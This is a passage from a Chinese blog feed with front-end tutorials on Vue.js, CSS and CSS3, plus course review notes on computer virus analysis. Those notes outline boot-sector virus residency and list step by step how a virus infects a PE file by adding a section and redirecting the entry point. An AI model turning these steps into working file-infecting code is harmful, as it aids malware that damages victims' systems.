Vue()</code>和<code>el</code>开始</h2><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"example1"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="template-variable">&#123;&#123; message &#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">  </span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://cdn.bootcss.com/vue/1.0.17/vue.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="comment">&lt;!-- vue.js 的加载视情况而定，可以用NPM，Bower，这里使用了国内的CDN --&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml">  </span></span><br><span class="line"><span class="xml">    new Vue(&#123;</span></span><br><span class="line"><span class="xml">      el: '#example1',</span></span><br><span class="line"><span class="xml">      data: &#123;</span></span><br><span class="line"><span class="xml">        message: 'Hello Vue.js!'</span></span><br><span class="line"><span class="xml">      &#125;</span></span><br><span class="line"><span class="xml">    &#125;)</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="v-model双向绑定"><a href="#v-model双向绑定" class="headerlink" title="v-model双向绑定"></a><code>v-model</code>双向绑定</h2><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"example2"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"greeting"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><span class="template-variable">&#123;&#123; greeting &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://cdn.bootcss.com/vue/1.0.17/vue.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">  new Vue(&#123;</span></span><br><span class="line"><span class="xml">    el: '#example2',</span></span><br><span class="line"><span class="xml">    data: &#123;</span></span><br><span class="line"><span class="xml">      greeting: 'Hello VueJs!'</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">  &#125;);</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>请尝试将 div &gt; p 中的<code>{{ greeting }}</code>改为<code>{{ $data }}</code>，<code>{{ $data | json }}</code>，<code>{{ $data.greeting }}</code>试试看。</p><h2 id="v-on响应事件"><a href="#v-on响应事件" class="headerlink" title="v-on响应事件"></a><code>v-on</code>响应事件</h2><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"example3"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><span class="template-variable">&#123;&#123; message &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">"reverseMessage"</span>&gt;</span>Reverse Message<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://cdn.bootcss.com/vue/1.0.17/vue.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml">  </span></span><br><span class="line"><span class="xml">    new Vue(&#123;</span></span><br><span class="line"><span class="xml">      el: '#example3',</span></span><br><span class="line"><span class="xml">      data: &#123;</span></span><br><span class="line"><span class="xml">        message: 'Hello Vue.js!'</span></span><br><span class="line"><span class="xml">      &#125;,</span></span><br><span class="line"><span class="xml">      methods: &#123;</span></span><br><span class="line"><span class="xml">        reverseMessage: function () &#123;</span></span><br><span class="line"><span class="xml">          this.message = this.message.split('').reverse().join('');</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">      &#125;</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>请尝试将 button 中的<code>v-on:click</code>改为<code>@click</code>看看效果。</p><h2 id="v-for和列表"><a href="#v-for和列表" class="headerlink" title="v-for和列表"></a><code>v-for</code>和列表</h2><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"example4"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"todo in todos"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123; todo.text &#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://cdn.bootcss.com/vue/1.0.17/vue.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    new Vue(&#123;</span></span><br><span class="line"><span class="xml">      el: '#example4',</span></span><br><span class="line"><span class="xml">      data: &#123;</span></span><br><span class="line"><span class="xml">        todos: [</span></span><br><span class="line"><span class="xml">        &#123; text: 'Learn JavaScript' &#125;,</span></span><br><span class="line"><span class="xml">        &#123; text: 'Learn Vue.js' &#125;,</span></span><br><span class="line"><span class="xml">        &#123; text: 'Build Something Awesome' &#125;</span></span><br><span class="line"><span class="xml">        ]</span></span><br><span class="line"><span class="xml">      &#125;</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>请尝试在 li 中添加<code>{{ $index }}</code>看看效果。</p><h2 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h2><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"example5"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> <span class="attr">v-model</span>=<span class="string">"x"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>result: </span><span class="template-variable">&#123;&#123; doubleX &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://cdn.bootcss.com/vue/1.0.17/vue.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml">    new Vue(&#123;</span></span><br><span class="line"><span class="xml">      el: '#example5',</span></span><br><span class="line"><span class="xml">      data: &#123;</span></span><br><span class="line"><span class="xml">        x: 1</span></span><br><span class="line"><span class="xml">      &#125;,</span></span><br><span class="line"><span class="xml">      computed: &#123;</span></span><br><span class="line"><span class="xml">        doubleX: function()&#123;</span></span><br><span class="line"><span class="xml">          return this.x*2;</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">      &#125;</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>请尝试将<code>computed</code>关键字改为<code>methods</code>，然后将<code>{{ doubleX }}</code>改为<code>{{ doubleX() }}</code>方法。</p><hr><p>差不多就这几个简单点。<br>以上</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>复习计算机病毒分析与防范</title>
      <link href="/2016/04-25-reviewVirusPrinciple/"/>
      <url>/2016/04-25-reviewVirusPrinciple/</url>
      
        <content type="html"><![CDATA[<h2 id="引导型病毒的工作原理"><a href="#引导型病毒的工作原理" class="headerlink" title="引导型病毒的工作原理"></a>引导型病毒的工作原理</h2><p>在BIOS后，操作系统前，通过中断服务程序(向量表 INT 13H)，占据物理位置(常驻内存高端)，替换、截获系统中断从而伺机传染发作。</p><h2 id="主引导扇区BS的结构"><a href="#主引导扇区BS的结构" class="headerlink" title="主引导扇区BS的结构"></a>主引导扇区BS的结构</h2><p>MBR主引导记录、DPT(Disk Partition Table)分区信息、结束标志(AA55H)。</p><h2 id="DPT结构（16字节）"><a href="#DPT结构（16字节）" class="headerlink" title="DPT结构（16字节）"></a>DPT结构（16字节）</h2><ul><li>一字节：分区状态、活动分区判定</li><li>一字节：开始磁头</li><li>.75字节（00 0001）：右边六位为起始扇区号</li><li>1.25字节 上面左边两位加上这里八位：起始柱面号</li><li>一字节：分区类型，0B为FAT32，83为Linux，07为ntfs，05是扩展分区</li><li>三字节：分区结束的磁头，扇区，柱面号</li><li>四字节：线性寻址方式下的分区相对扇区地址</li><li>四字节：该分区占用的 总扇区数</li></ul><h2 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h2><p>MZ文件头（4D5A），DOS插桩程序，NT映像头（Signature、FileHeader、OptionalHeader），节表，节（包含引入引出节）。</p><h2 id="为什么要重定位技术"><a href="#为什么要重定位技术" class="headerlink" title="为什么要重定位技术"></a>为什么要重定位技术</h2><p>病毒要用到变量，但依附到程序上时位置变化就不能正常使用，这里需要用到重定位。</p><h2 id="如何实现重定位"><a href="#如何实现重定位" class="headerlink" title="如何实现重定位"></a>如何实现重定位</h2><ol><li>call跳到下一条指令，使下一条指令感染后的实际地址进栈。</li><li>用pop或mov exx,[esp] 去除栈顶内容，这样就得到了感染后下一条指令的实际地址。</li><li>令V_start为感染前call的下一条指令地址。Var_lable为感染前变量地址。于是变量Var的实际地址为Base + (OffSet(Var_Lable) - OffSet(V_start))</li></ol><h2 id="蠕虫和普通病毒的对比"><a href="#蠕虫和普通病毒的对比" class="headerlink" title="蠕虫和普通病毒的对比"></a>蠕虫和普通病毒的对比</h2><p>病毒：寄生存在、插入宿主复制、宿主运行时传染、针对本地、user触发、影响文件系统、user水平决定传播、摘除还原<br>蠕虫：独立存在、拷贝自身复制、系统漏洞传染、针对网络、自身触发、影响网络系统性能、user水平不影响、补丁还原</p><h2 id="判断PE文件的方法"><a href="#判断PE文件的方法" class="headerlink" title="判断PE文件的方法"></a>判断PE文件的方法</h2><p>mz头4d5a，pe头（nt映像头signature）50450000。</p><h2 id="感染PE文件的方法-如何实现添加新节"><a href="#感染PE文件的方法-如何实现添加新节" class="headerlink" title="感染PE文件的方法/如何实现添加新节"></a>感染PE文件的方法/如何实现添加新节</h2><ol><li>判断MZ、PE、感染标记</li><li>获得数据目录Directory个数（每个8字节）</li><li>获得节表起始位置（Directory偏移地址+目录字节数）、最后节表的末尾偏移（节表起始位置+节个数*28H）</li><li>新节写入节表<ol><li>节名8</li><li>节的实际字节数4</li><li>本节开始偏移地址（上一节开始偏移地址+(上节大小/节对齐+1)*节对齐）</li><li>本节对齐后大小</li><li>本节在文件中的开始位置（上节文件开始位置+上节对齐后大小）</li></ol></li><li>修改nt映像头节表数</li><li>替换AddressOfEntryPoint为病毒入口</li><li>更新pe映像尺寸SizeOfImage（原SizeOfImage+病毒节对齐后大小）</li><li>写入感染标记，病毒代码，设置当前位置为文件末尾</li></ol><hr><h2 id="系统引导过程"><a href="#系统引导过程" class="headerlink" title="系统引导过程"></a>系统引导过程</h2><ol><li>开机</li><li>BIOS加电自检，电源稳定后，CPU从内存地址ffff:0000处开始执行</li><li>BS读入 0000:7c00</li><li>检查0000：7def 是否为0xaa55</li><li>跳转到0000:7c00处执行MBR</li><li><strong>以下由MBR程序执行</strong></li><li>MBR将自己复制到0000:0600处</li><li>在主分区表中搜索是否有活动分区</li><li>将活动分区的第一个扇区读入0000:7c00</li><li>检查0000：7def 是否为0xaa55</li><li>跳转到0000:7c00处继续执行启动程序</li></ol><h2 id="病毒如何常驻内存"><a href="#病毒如何常驻内存" class="headerlink" title="病毒如何常驻内存"></a>病毒如何常驻内存</h2><p>将自身复制到内存高端（10 0000H之后），修改内存容量标志单元（0000:0413处），减去病毒长度，使得常驻内存；然后将原int 13h磁盘中断服务程序的中断向量保存，并修改其指向病毒代码</p><h2 id="引导型病毒特点"><a href="#引导型病毒特点" class="headerlink" title="引导型病毒特点"></a>引导型病毒特点</h2><ol><li>在操作系统之前进入内存</li><li>减少操作系统所掌管的内存大小</li><li>修改int 13h 的中断向量，指向内存高端</li><li>必定驻留硬盘的主引导扇区或引导扇区，并且只驻留一次</li><li>把感染的主引导扇区或引导扇区和未感染的进行比较，若不一样，有毒。</li></ol><h2 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h2><p>储存了每个节（数目由NumberOfSection决定）的具体信息，每个节信息大小为28H/40。</p><h2 id="引入引出节"><a href="#引入引出节" class="headerlink" title="引入引出节"></a>引入引出节</h2><p>引入表exe：是用来描述可执行文件需要调用的外部函数（API）。<br>引出表dll：DLL向PE提供的导出函数信息的列表，通常这些信息包含了导出的函数名和函数的地址。  </p><h2 id="动态获取api"><a href="#动态获取api" class="headerlink" title="动态获取api"></a>动态获取api</h2><p>LoadLibrary加载一个DLL，返回DLL地址。<br>GetProcAddress通过DLL地址和API函数名获得API函数的地址。</p><hr><h2 id="木马结构"><a href="#木马结构" class="headerlink" title="木马结构"></a>木马结构</h2><p>木马软件一般由木马配置程序、控制端程序和被控端程序三部分组成。</p>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CssOrder</title>
      <link href="/2016/04-23-cssOrder/"/>
      <url>/2016/04-23-cssOrder/</url>
      
        <content type="html"><![CDATA[<p>阅读了<a href="http://www.w3cn.org/article/translate/2005/104.html" target="_blank" rel="noopener">CSS的十八般技巧</a>和<a href="http://www.shejidaren.com/css-written-specifications.html" target="_blank" rel="noopener">推荐大家使用的CSS书写规范、顺序</a>两篇文章之后，对css 压缩和美化有了另一番认识。<br><code>2016-04-27 更新</code>：发现CSSComb已经实现并且很优雅。<a href="http://csscomb.com/" target="_blank" rel="noopener">csscomb</a></p><hr><h1 id="美化-Beautify-EasytoRead"><a href="#美化-Beautify-EasytoRead" class="headerlink" title="美化/ Beautify/ EasytoRead"></a>美化/ Beautify/ EasytoRead</h1><h2 id="书写顺序"><a href="#书写顺序" class="headerlink" title="书写顺序"></a>书写顺序</h2><p>这个并没有统一的标准，以便于阅读理解为首要目的排序。<br>显示属性  </p><ul><li>display</li><li>float</li><li>position</li></ul><p>自身属性  </p><ul><li>width</li><li>height</li><li>margin</li><li>outline</li><li>border</li><li>padding</li><li>background</li></ul><p>文本属性</p><ul><li>color </li><li>font</li><li>vertical-align</li><li>white-space</li><li>content</li></ul><h2 id="CSS顺序"><a href="#CSS顺序" class="headerlink" title="CSS顺序"></a>CSS顺序</h2><p>css中节点排序，暂时没有想到一个好办法。大概思路就是按照Dom节点的顺序排序，但是js如何获得css选择器一样的节点集呢？<br>问题暂时放这里。  </p><hr><h1 id="压缩-Uglify-Compress"><a href="#压缩-Uglify-Compress" class="headerlink" title="压缩/ Uglify/ Compress"></a>压缩/ Uglify/ Compress</h1><h2 id="CSS缩写"><a href="#CSS缩写" class="headerlink" title="CSS缩写"></a>CSS缩写</h2><ul><li>background: background-image ~-repeat ~-position</li><li>font: font-style | font-variant | font-weight | font-size | line-height | font-family</li><li>去掉最后一个分号</li><li>去掉小数点前的 0</li><li>去掉 0 之后的单位</li><li>rgb/rgba 颜色值简写为16进制值</li><li>在确定能减少总大小的前提下，用合并条目</li><li>（不确定）去掉选择器前的 ul，div 等无效名</li><li>（不确定）其他简写方式，例如 border-top-style: none -&gt; border-top: 0</li></ul><hr><p>在写出自己的自动化工具之前还是用用其他工具，然后书写时也注意一些吧。<br>以上</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSS3笔记</title>
      <link href="/2016/04-22-CSS3notes/"/>
      <url>/2016/04-22-CSS3notes/</url>
      
        <content type="html"><![CDATA[<p>当时看w3school的CSS3时记下来的一些（私以为）容易忽略的要点，写下来再加深印象。</p><h1 id="边框"><a href="#边框" class="headerlink" title="边框"></a>边框</h1><p>border-radius: 1-4 length|% / 1-4 length|%;<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">border</span>-<span class="built_in">radius</span>:2em;</span><br><span class="line"><span class="built_in">border</span>-<span class="built_in">radius</span>: 2em 1em 4em / <span class="number">0.</span>5em 3em;</span><br></pre></td></tr></table></figure></p><ul><li>1个值：(top, right, bottom, left)；</li><li>2个值：(top, bottom), (left, right)；</li><li>3个值：top, (left, right), bottom；</li><li>4个值：(top), (right), (bottom), (left)；</li></ul><p>box-shadow: h-shadow v-shadow blur spread color inset;<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">box-shadow</span>: <span class="number">10px</span> <span class="number">10px</span> <span class="number">5px</span> <span class="number">#888888</span>;</span><br><span class="line"><span class="attribute">box-shadow</span>: <span class="number">2px</span> <span class="number">2px</span> <span class="number">3px</span> <span class="number">#aaaaaa</span>;</span><br></pre></td></tr></table></figure></p><p><code>border-image: &lt;&#39;border-image-source&#39;&gt; || &lt;&#39;border-image-slice&#39;&gt; [/ &lt;&#39;border-image-width&#39;&gt; |/ &lt;&#39;border-image-width&#39;&gt;? /&lt;&#39;border-image-outset&#39;&gt; ]? || &lt;&#39;border-image-repeat&#39;&gt;</code><br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">border</span>: <span class="number">10px</span> solid gray;</span><br><span class="line"><span class="attribute">border-image</span>: url(<span class="string">test.png</span>) <span class="number">10</span>/<span class="number">10px</span>;</span><br></pre></td></tr></table></figure></p><hr><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>background-size: length|percentage|cover|contain;<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">background</span>-<span class="built_in">size</span>:<span class="number">35</span>% <span class="number">100</span>%;</span><br><span class="line"><span class="built_in">background</span>-<span class="built_in">size</span>:<span class="number">80</span>px <span class="number">60</span>px;</span><br></pre></td></tr></table></figure></p><p>background-origin: padding-box|border-box|content-box;<br>padding-box根据padding定位<br>border-box根据margin定位<br>content-box根据content定位<br>background-clip: padding-box|border-box|content-box;<br>padding-box在padding内绘制<br>border-box在margin内绘制<br>content-box在content内绘制<br>关于上面这两个的区别运用，<a href="http://www.planabc.net/2008/04/14/background-clip_background-origin/" target="_blank" rel="noopener">看这一篇文章</a>，写的真好。  </p><hr><h1 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h1><p>text-shadow: h-shadow v-shadow blur color;<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">text-shadow</span>: <span class="number">5px</span> <span class="number">5px</span> <span class="number">5px</span> <span class="number">#FF0000</span>;</span><br><span class="line"><span class="attribute">text-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">3px</span> <span class="number">#FF0000</span>;</span><br></pre></td></tr></table></figure></p><p>word-wrap: normal|break-word;<br>word-break: normal|break-all|keep-all;<br>关于上面这两个的区别运用，<a href="http://blog.csdn.net/u011043843/article/details/39375677?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">看这一篇文章</a>。<br>主要区别是，<code>word-wrap</code>是另起一行后分割，<code>word-break</code>是直接分割。</p><hr><h1 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h1><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">  font-family: &lt;YourWebFontName&gt;;</span><br><span class="line">  src: &lt;source&gt; <span class="meta">[&lt;format&gt;]</span>[,&lt;source&gt; <span class="meta">[&lt;format&gt;]</span>]*;</span><br><span class="line">  [font-weight: &lt;weight&gt;];</span><br><span class="line">  [font-style: &lt;style&gt;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是一个多浏览器支持的例子：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  @<span class="keyword">font-face</span> &#123;</span><br><span class="line"><span class="attribute">font-family</span>: <span class="string">'YourWebFontName'</span>;</span><br><span class="line"><span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">'YourWebFontName.eot'</span>); <span class="comment">/* IE9 Compat Modes */</span></span><br><span class="line"><span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">'YourWebFontName.eot?#iefix'</span>) <span class="built_in">format</span>(<span class="string">'embedded-opentype'</span>), <span class="comment">/* IE6-IE8 */</span></span><br><span class="line">            <span class="built_in">url</span>(<span class="string">'YourWebFontName.woff'</span>) <span class="built_in">format</span>(<span class="string">'woff'</span>), <span class="comment">/* Modern Browsers */</span></span><br><span class="line">            <span class="built_in">url</span>(<span class="string">'YourWebFontName.ttf'</span>)  <span class="built_in">format</span>(<span class="string">'truetype'</span>), <span class="comment">/* Safari, Android, iOS */</span></span><br><span class="line">            <span class="built_in">url</span>(<span class="string">'YourWebFontName.svg#YourWebFontName'</span>) <span class="built_in">format</span>(<span class="string">'svg'</span>); <span class="comment">/* Legacy iOS */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>先引入，后同系统已有字体使用。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JS笔记</title>
      <link href="/2016/04-21-JSnotes/"/>
      <url>/2016/04-21-JSnotes/</url>
      
        <content type="html"><![CDATA[<p>这几天主要是在看JS，小本本上记录了一些（私以为）具有代表性的要点，这里写一遍再加深一下印象。<br><a id="more"></a></p><h1 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h1><p>code 1/2:<br><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> base = &#123;</span><br><span class="line"><span class="attribute">name</span>: <span class="string">'base'</span>,</span><br><span class="line"><span class="attribute">getInfo</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ext1 = &#123;</span><br><span 